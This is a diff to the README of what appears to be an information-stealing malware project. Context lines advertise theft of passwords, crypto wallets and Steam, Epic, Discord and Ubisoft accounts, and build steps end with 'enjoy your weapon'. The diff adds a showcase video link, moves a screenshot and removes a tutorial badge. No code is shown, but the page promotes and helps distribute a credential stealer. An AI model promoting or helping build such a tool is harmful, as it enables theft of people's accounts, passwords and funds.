@@ -40,6 +40,7 @@ Thats All I really hope u will have fun with this, PLEASE TELL ME WHAT SHOULD I 
 - [How to Build?](#how-to-build)
 - [Support the Project](#support-the-project)
 - [Tutorial](#support-the-project)
+- [Showcase](#showcase+tutorial)
 
 ## Download
 
@@ -93,6 +94,9 @@ Thats All I really hope u will have fun with this, PLEASE TELL ME WHAT SHOULD I 
 
 Passwords,Wallets,Steam,Epic,Discord,Ubisoft and more.
 
+## ShowCase + Tutorial
+[![Screenshot 2024-07-31 140412](https://github.com/user-attachments/assets/dccbba8b-554c-48ae-b371-f6cb23d810d6)](https://streamable.com/yrewvj)
+
 
 ## Requirements
 
@@ -100,7 +104,7 @@ Passwords,Wallets,Steam,Epic,Discord,Ubisoft and more.
 - Windows 10+
 - Latest [Python Version](https://www.python.org/downloads/)
 - An active internet connection.
-- 
+  
 [![Screenshot 2024-07-31 140412](https://github.com/user-attachments/assets/dccbba8b-554c-48ae-b371-f6cb23d810d6)](https://streamable.com/yrewvj)
 
 ## How to Build?
@@ -117,7 +121,6 @@ Passwords,Wallets,Steam,Epic,Discord,Ubisoft and more.
 10. If .exe Navigate To "Dist" folder
 11. enjoy your weapon.
 
-[![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
 
 ## Support the Project
 
